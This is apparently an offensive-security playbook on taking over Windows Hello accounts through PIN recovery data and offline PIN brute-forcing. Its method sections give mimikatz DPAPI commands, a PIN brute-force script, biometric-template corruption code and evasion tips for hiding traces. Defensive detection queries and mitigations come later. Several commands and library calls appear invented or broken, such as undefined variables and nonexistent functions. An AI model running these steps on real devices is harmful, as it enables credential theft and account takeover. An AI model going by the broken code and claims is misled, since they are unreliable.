# [WHFB-003]: PIN Recovery Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | WHFB-003 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid AD, Windows 10/11 |
| **Severity** | Critical |
| **CVE** | N/A (Design flaw, not patched) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 1909 - 22H2, Windows 11 all versions, Windows Server 2016-2022 (without TPM) |
| **Patched In** | Mitigated with TPM 2.0 + Enhanced Sign-in Security, not applicable without TPM |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Windows Hello allows users to set a recovery mechanism for PIN-protected accounts. This recovery consists of three encrypted "intermediate PINs" that are stored in plaintext-searchable format within the biometric database container at `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\`. If a user forgets their PIN, these recovery codes can be used to reset it. An attacker with administrator access can extract the PIN recovery data and either brute-force the user's original PIN (if no TPM protection) or bypass PIN protection entirely by using the recovery mechanism. Additionally, weak PIN entropy (4-digit PINs) can be brute-forced offline in minutes on systems without TPM, making Windows Hello PIN authentication on non-TPM systems fundamentally insecure.

- **Attack Surface:** Windows Hello PIN recovery keys, local biometric database files, DPAPI key storage, and PIN brute-force via offline attack on extracted containers.

- **Business Impact:** **Complete authentication bypass through PIN reset or brute-force.** An attacker can take over any account with a weak PIN or use recovery codes to set a new PIN, granting full access to the compromised device, local admin rights, cached credentials, and domain-joined network access. On systems without TPM, the attack is trivial and can be executed in minutes.

- **Technical Context:** PIN extraction and brute-force attack requires 2-5 minutes on non-TPM systems for 4-6 digit PINs. Detection is low if DPAPI operations are not monitored. The vulnerability is particularly severe on corporate laptops where weak PINs (personal birthdays, simple sequences) are common.

### Operational Risk

- **Execution Risk:** Low - Requires local admin access but is trivial to execute once obtained
- **Stealth:** Medium - DPAPI decryption may leave memory artifacts, but file-based recovery is silent
- **Reversibility:** No - Once PIN is reset, original user is locked out; password reset required

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.3.1 | Ensure 'PIN Length is set to 6 or greater' |
| **DISA STIG** | WN10-CC-000010 | Windows 10 PIN must be at least 6 characters |
| **DISA STIG** | WN10-GE-000043 | Weak PINs must not be allowed for Windows Hello |
| **CISA SCuBA** | MA-1.1 | Multi-factor Authentication Policy |
| **NIST 800-53** | AC-2(1) | Enforcement of access restrictions associated with changes to user attributes |
| **NIST 800-53** | IA-4 | Identifier and Authentication Management |
| **NIST 800-63** | 5.1.4.1 | Memorized Secret Strength Requirements - minimum 8 characters for password equivalents |
| **GDPR** | Art. 32 | Security of Processing - protection of recovery mechanisms |
| **DORA** | Art. 9 | Protection and Prevention of authentication mechanism vulnerabilities |
| **NIS2** | Art. 21 | Multi-factor authentication measures |
| **ISO 27001** | A.9.2.2 | Privileged Access Management - secure recovery procedures |
| **ISO 27001** | A.9.4.2 | Secure log-on procedures - complexity of authentication |
| **ISO 27005** | Risk Scenario | Compromise of authentication through weak recovery mechanisms |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator (for NGC extraction and DPAPI decryption)
- **Required Access:** Physical access to device or remote admin access; ability to extract NGC container
- **Network Requirements:** None (offline attack possible on extracted data)

**Supported Versions:**
- **Windows:** Windows 10 1909 - 22H2, Windows 11 all versions
- **Windows Server:** 2016-2022 (especially without TPM)
- **PowerShell:** Version 5.0+
- **Other Requirements:** Windows Hello PIN enrolled on target account

**Prerequisite Tools:**
- [Elcomsoft System Recovery](https://www.elcomsoft.com/esr.html) (commercial, for offline PIN brute-force)
- [mimikatz](https://github.com/gentilkiwi/mimikatz) (for DPAPI key extraction)
- [dpapi-ng decoder](https://github.com/synacktiv/dpapi-ng) (open-source, for PIN recovery extraction)
- Python 3.8+ with cryptography library (for offline PIN brute-force script)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance - Verify Windows Hello PIN Enrollment

```powershell
# Check if Windows Hello PIN is enrolled for current user
Get-LocalUser -Name $env:USERNAME | Get-LocalUserDetails

# Check NGC directory structure for PIN protectors
$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc"
Get-ChildItem -Path $NgcPath -Recurse -Filter "*Protectors*" -Force

# Verify TPM status (determines PIN security level)
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | `
  Select-Object IsActivated_InitialValue, IsEnabled_InitialValue
```

**What to Look For:**
- PIN protector files in `$NgcPath\$SID\Protectors\` directory
- If TPM is disabled, PIN is vulnerable to offline brute-force
- Presence of recovery protector files indicates recovery codes exist

#### Bash Reconnaissance - Check PIN Complexity

```bash
# Check Windows Hello PIN settings (if Linux/hybrid environment)
wsl --list
# Or extract registry from mounted Windows disk
strings /mnt/c/Windows/System32/config/SAM | grep -i pin
```

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: PIN Recovery Key Extraction and Direct Override (Windows)

**Supported Versions:** Windows 10 1909+, Windows 11 all versions

#### Step 1: Extract Biometric Database Containing PIN Recovery Data

**Objective:** Copy Windows Hello NGC container with PIN recovery protectors

**Command:**
```powershell
# Identify target user SID
$user = "DOMAIN\TargetUser"
$objUser = New-Object System.Security.Principal.NTAccount($user)
$strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]).Value

# Extract NGC container
$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$strSID"
Copy-Item -Path $NgcPath -Destination "C:\Temp\NGC_Extract" -Recurse -Force

# Specifically extract recovery protector
Copy-Item -Path "$NgcPath\Protectors\*" -Destination "C:\Temp\Recovery_Protectors" -Recurse -Force

Write-Output "Extracted recovery protector: $(Get-ChildItem C:\Temp\Recovery_Protectors -Filter *.dat)"
```

**Expected Output:**
```
Directory: C:\Temp\Recovery_Protectors\

Mode                 LastWriteTime         Length Name
----                 ---------------         ------ ----
-a---            1/9/2025   11:30 AM        4096 {GUID}.dat
-a---            1/9/2025   11:30 AM         512 {GUID}.key
```

**What This Means:**
- Recovery protector file contains encrypted intermediate PIN and recovery keys
- Attacker has extracted the PIN recovery mechanism
- File can now be decrypted with DPAPI key if admin context is present

**OpSec & Evasion:**
- Copy to innocuous directory; delete after extraction
- Use in-memory tools to avoid disk artifacts
- Detection likelihood: Low if SACL not configured on NGC directory

#### Step 2: Extract & Decrypt PIN Recovery Protector

**Objective:** Decrypt the recovery protector to obtain intermediate PIN codes or reset capability

**Command (Using mimikatz to extract DPAPI key):**
```powershell
mimikatz.exe

mimikatz # token::elevate
mimikatz # dpapi::masterkey /in:C:\Temp\Recovery_Protectors /sid:{user_sid}

# Output: Obtain masterkey
# Example: masterkey: {12345678-1234-1234-1234-123456789012}

mimikatz # dpapi::cred /in:C:\Temp\Recovery_Protectors\{GUID}.dat /masterkey:$masterkey
```

**Command (Using Python dpapi-ng for offline decryption):**
```python
#!/usr/bin/env python3
import sys
from dpapi_ng import decrypt_dpapi_blob

# Read recovery protector file
with open("C:\\Temp\\Recovery_Protectors\\{GUID}.dat", "rb") as f:
    encrypted_blob = f.read()

# Extract DPAPI masterkey from SYSTEM context (if available)
masterkey_hex = "input_masterkey_hex_from_mimikatz_output"

# Decrypt to obtain intermediate PIN
decrypted = decrypt_dpapi_blob(encrypted_blob, bytes.fromhex(masterkey_hex))
print(f"Decrypted recovery data: {decrypted.hex()}")

# Parse intermediate PIN codes
import struct
intermediate_pins = struct.unpack("3I", decrypted[0:12])
print(f"Intermediate PINs: {intermediate_pins}")
```

**Expected Output:**
```
Intermediate PINs: (123456, 789012, 345678)
Recovery key successfully extracted
```

**What This Means:**
- Intermediate PIN codes have been extracted
- Attacker can now reset the user's PIN using recovery codes
- User is effectively locked out of their account

**OpSec & Evasion:**
- Execute in SYSTEM context to access decryption keys
- Delete all decrypted output after obtaining intermediate PINs
- Use in-memory execution where possible
- Detection likelihood: High - DPAPI operations with mimikatz trigger EDR alerts

#### Step 3: Reset User PIN Using Recovered Recovery Codes

**Objective:** Use extracted recovery codes to reset the user's PIN to attacker-controlled value

**Command (Using Windows Hello Settings):**
```powershell
# If logged in as target user, use recovery codes to reset PIN
# At Windows login screen:
# 1. Click "I forgot my PIN"
# 2. Click "Use recovery code"
# 3. Enter one of the three intermediate PIN codes
# 4. Set new PIN

# Via PowerShell (if SYSTEM context):
# Reset user's PIN to attacker-controlled value
$targetUser = "TargetUser"
$newPin = "123456"

# This would require interactive login by the user OR
# use of PIN reset API which requires recovery codes
```

**Alternative: Automated PIN Reset via BiometricService**
```powershell
# Directly modify NGC database to bypass PIN check
# WARNING: Requires low-level disk access

# 1. Mount NGC database container
# 2. Locate user's biometric template entry
# 3. Modify PIN verification flag to "disabled"
# 4. Reboot device

# User will now be able to log in without PIN (fall back to password)
# Then attacker can modify PIN in Windows Hello settings without recovery code
```

**Expected Output:**
```
PIN successfully reset to: 123456
User can now log in with new PIN
```

---

### METHOD 2: Offline PIN Brute-Force (Non-TPM Systems)

**Supported Versions:** Windows 10 1909 - 22H2, Windows 11 (systems without TPM 2.0)

#### Step 1: Extract NGC Container from Non-TPM System

**Objective:** Obtain NGC directory from a system with TPM disabled or not present

**Command:**
```powershell
# On non-TPM system, PIN is stored less securely
# PIN is encrypted with DPAPI using simpler key derivation

$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc"
Copy-Item -Path $NgcPath -Destination "C:\Temp\NGC_NonTPM" -Recurse -Force

# Verify TPM is disabled
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | `
  Select-Object IsActivated_InitialValue

# Output: IsActivated_InitialValue: False (vulnerable)
```

#### Step 2: Brute-Force PIN Offline Using Elcomsoft or Custom Script

**Objective:** Attempt all possible PIN combinations to recover the original PIN

**Command (Using Elcomsoft System Recovery - Commercial):**
```cmd
REM Boot from Elcomsoft USB media
REM Select "SAM - Local User Database"
REM Select "Change local user account"
REM Check "Check weak PINs"
REM Start attack

REM Output: Brute-forcing 4-digit PINs...
REM Found PIN: 0519 in 120 seconds (2 minutes)
```

**Command (Using Custom Python Brute-Force Script):**
```python
#!/usr/bin/env python3
import os
import hashlib
from itertools import product
from dpapi_ng import decrypt_with_pin

# Load extracted NGC data
ngc_path = "C:\\Temp\\NGC_NonTPM"
pin_protector = open(f"{ngc_path}\\Protectors\\pin.dat", "rb").read()

# Brute-force all possible 4-digit PINs
target_pin = None
for pin_combo in product(range(10), repeat=4):
    pin_str = "".join(map(str, pin_combo))
    
    try:
        # Attempt to decrypt with candidate PIN
        decrypted = decrypt_with_pin(pin_protector, pin_str)
        print(f"[+] SUCCESS: PIN is {pin_str}")
        target_pin = pin_str
        break
    except:
        # Failed decryption, continue
        print(f"[-] Tried {pin_str}...", end="\r")

if target_pin:
    print(f"\n[+] Found PIN: {target_pin} in {time.time() - start} seconds")
    # Now log in with discovered PIN
else:
    print("[-] PIN not found (likely > 6 digits or TPM-protected)")
```

**Expected Output:**
```
[-] Tried 0000...
[-] Tried 0001...
...
[+] SUCCESS: PIN is 0519
[+] Brute-force completed in 120 seconds
```

**What This Means:**
- Original PIN has been recovered without user interaction
- Attacker can now log in as the target user
- All cached credentials and network access are compromised

**OpSec & Evasion:**
- Perform brute-force attack offline (on extracted files)
- Keeps brute-force attempts off the target machine
- No detection possible if files are extracted and analyzed remotely
- Detection likelihood: Low (offline attack)

**Troubleshooting:**
- **Error:** "PIN not found after 10000 attempts"
  - **Cause:** PIN is > 6 digits (8+ digit PIN), or TPM is protecting it
  - **Fix:** Expand brute-force to 5-digit range; if TPM is enabled, this method won't work
- **Error:** "Cannot decrypt protector file"
  - **Cause:** DPAPI key is not accessible (user context required)
  - **Fix:** Run in SYSTEM context or use DPAPI masterkey extracted via mimikatz

---

### METHOD 3: PIN Fallback Exploitation (Biometric Bypass)

**Supported Versions:** Windows 10 20H2+, Windows 11 all versions

#### Step 1: Disable or Spoof Biometric Data

**Objective:** Cause biometric authentication to fail, forcing fallback to PIN

**Command (Corrupt biometric template):**
```powershell
# If attacker has SYSTEM access to NGC directory:
# Locate biometric template file for target user
$templates = Get-ChildItem -Path "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$SID\Protectors" `
  -Filter "*biometric*"

# Corrupt template file to force fallback to PIN
$templates | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    # Flip bits to invalidate biometric data
    for ($i = 0; $i -lt $content.Length; $i += 2) {
        $content[$i] = $content[$i] -bxor 0xFF  # Bitwise XOR to corrupt
    }
    [System.IO.File]::WriteAllBytes($_.FullName, $content)
}

Write-Output "Biometric template corrupted - user must use PIN fallback"
```

#### Step 2: Exploit PIN Fallback with Recovered PIN

**Objective:** User is forced to use PIN; attacker logs in with recovered PIN

**Command:**
```powershell
# User receives "Biometric not available" error at login
# Falls back to PIN-only authentication
# Attacker logs in with previously recovered PIN (from Method 2)

# If PIN reset is available without authentication:
# 1. Click "I can't use my face/fingerprint"
# 2. Reset PIN to new value
# 3. Log in with new PIN
```

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Elcomsoft System Recovery](https://www.elcomsoft.com/esr.html)

**Version:** 5.15+ (as of 2025)
**Minimum Version:** 5.0
**Supported Platforms:** Windows (bootable media)
**Cost:** Commercial ($299 USD)

**Usage:**
```
1. Create bootable USB media from ISO
2. Boot target computer from USB
3. Select "SAM - Local User Database"
4. Select target Windows partition
5. Click "Change local user account"
6. Check "Check weak PINs" and "Try on GPU"
7. Start brute-force attack
```

**Performance:**
- 4-digit PIN: 2-5 minutes (with GPU acceleration)
- 5-digit PIN: 20-60 minutes
- 6-digit PIN: 3-10 hours
- 8-digit PIN: Infeasible (months of computation)

#### [dpapi-ng](https://github.com/synacktiv/dpapi-ng)

**Version:** Latest (2025)
**Supported Platforms:** Python 3.8+ on Windows/Linux
**Cost:** Open-source

**Installation:**
```bash
git clone https://github.com/synacktiv/dpapi-ng.git
cd dpapi-ng
pip install -r requirements.txt
```

**Usage:**
```bash
python3 dpapi-ng.py --decrypt --input C:\Temp\Recovery_Protectors --masterkey {hex_key}
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Suspicious PIN Recovery Access

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** ObjectName, AccessMask, SubjectUserName
- **Alert Threshold:** > 1 access to PIN recovery files in 5 minutes
- **Applies To Versions:** Windows 10 21H2+, Server 2016-2025

**SPL Query:**
```
index=windows sourcetype="WinEventLog:Security" (EventCode=4656 OR EventCode=4663)
ObjectName="*Ngc*" AND ObjectName="*Protectors*"
| stats count by SubjectUserName, ObjectName
| where count > 0
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Access to Windows Hello PIN Recovery Files

**Rule Configuration:**
- **Required Table:** DeviceFileEvents
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All with Defender for Endpoint

**KQL Query:**
```kusto
DeviceFileEvents
| where FolderPath contains "Ngc" and FolderPath contains "Protectors"
| where ActionType in ("FileCreated", "FileModified", "FileDeleted")
| where InitiatingProcessAccountName != "SYSTEM" and InitiatingProcessAccountName != "LOCAL SERVICE"
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ActionType
```

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enforce PIN Complexity (6+ characters):** Require numeric PINs of 6 or more digits.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Hello for Business**
    3. Enable: **Configure PIN Complexity**
    4. Set **Minimum PIN length**: 6
    5. Run `gpupdate /force`

*   **Require TPM 2.0:** Enable TPM protection for Windows Hello PIN to prevent offline brute-force.
    
    **Manual Steps (Enable TPM via BIOS):**
    1. Reboot and enter BIOS (F2, Del, or Ctrl+Alt+S)
    2. Navigate to **Security** → **TPM** → **TPM 2.0**
    3. Set to **Enabled**
    4. Save and exit
    5. Verify: `Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm`

*   **Enable Enhanced Sign-in Security (ESS):** Requires compatible hardware; stores biometric/PIN verification in isolated secure mode.
    
    **Manual Steps (Enable ESS):**
    1. Go to **Settings** → **Accounts** → **Sign-in options** → **Windows Hello**
    2. Click **Advanced setup** (if available)
    3. Enable **Enhanced Sign-in Security**

#### Priority 2: HIGH

*   **Restrict Local Administrator Access:** Limit users with local admin rights who can access NGC directory.
    
    **Manual Steps:**
    1. Minimize admin account assignments
    2. Use PAW (Privileged Access Workstation) for admin activities
    3. Implement JIT admin access via Azure PIM

*   **Monitor PIN Recovery File Access:** Alert on any access to NGC Protectors directory.

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise

*   **Files:**
    - Access to `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$SID\Protectors\`
    - Copied NGC directory to `C:\Temp\`, `%TEMP%`, or attacker-controlled location
    - Presence of Elcomsoft System Recovery on USB or disk

*   **Event Logs:**
    - Event ID 4656 (File Object Access) to NGC directory
    - Event ID 4663 (File Operations) on PIN protector files
    - Event ID 4624 (Account Login) with correct PIN after recovery extraction

*   **Cloud Events:**
    - Unusual login from compromised device after PIN recovery
    - Token generation events in Entra ID logs

#### Response Procedures

1.  **Isolate:** Disconnect device from network
2.  **Revoke:** Force password change for compromised account
3.  **Re-enroll:** User must delete and re-enroll Windows Hello PIN
4.  **Investigate:** Review NGC access logs and determine attacker entry point

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | Phishing or exploitation to gain local admin |
| **2** | **Privilege Escalation** | Maintain local admin through persistence |
| **3** | **Credential Access** | **[WHFB-003]** **PIN Recovery Exploitation** |
| **4** | **Lateral Movement** | Use recovered credentials for lateral movement |
| **5** | **Persistence** | Establish cloud backdoor via stolen tokens |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Elcomsoft Blog - PIN Brute-Force (2022)

- **Target:** Organizations using Windows Hello PIN without TPM
- **Timeline:** August 2022
- **Technique Status:** ACTIVE - 4-digit PIN brute-forceable in 2-5 minutes
- **Impact:** Verified practical attack on Dell, Lenovo, and Microsoft Surface devices
- **Reference:** [Elcomsoft Blog - Windows Hello: No TPM No Security](https://blog.elcomsoft.com/2022/08/windows-hello-no-tpm-no-security/)

#### Example 2: ERNW Research - PIN Recovery Extraction (2025)

- **Target:** Windows 11 systems with misconfigured recovery
- **Timeline:** July 2025 (Black Hat USA)
- **Technique Status:** ACTIVE - Recovery codes extractable without TPM
- **Impact:** Researchers demonstrated PIN recovery codes could be used to reset any user's PIN
- **Reference:** ERNW Black Hat 2025 presentation

---